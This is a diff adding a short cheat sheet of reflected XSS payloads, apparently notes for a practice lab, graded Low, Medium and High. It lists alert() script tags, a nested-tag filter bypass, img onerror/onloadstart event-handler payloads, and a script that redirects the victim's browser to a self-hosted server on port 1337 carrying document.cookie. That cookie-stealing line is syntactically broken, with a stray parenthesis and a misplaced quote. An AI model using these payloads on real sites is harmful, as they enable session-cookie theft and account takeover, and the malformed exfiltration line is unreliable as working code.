@@ -1,0 +1,26 @@
+# XSS-Reflected (Difficulty: Low)
+
+<script>alert("This site is hacked")</script>
+<script>alert(document.cookie)</script>
+
+To  redirect loaction and see the cookie in own server,
+Start your own server in VM by -
+
+	python2: python -m SimpleHTTPServer 1337
+	python3: python -m http.server 1337
+<script>window.location='http://127.0.0.1:1337)/?cookie'= +document.cookie</script>
+
+
+
+# XSS-Reflected (Difficulty: Medium)
+
+<SCRIPT>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</script>
+
+
+# XSS-Reflected (Difficulty: High)
+
+<img src=validimage.png onloadstart=alert(1)>
+<img src/onerror=alert(document.cookie)>
+
+Res: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
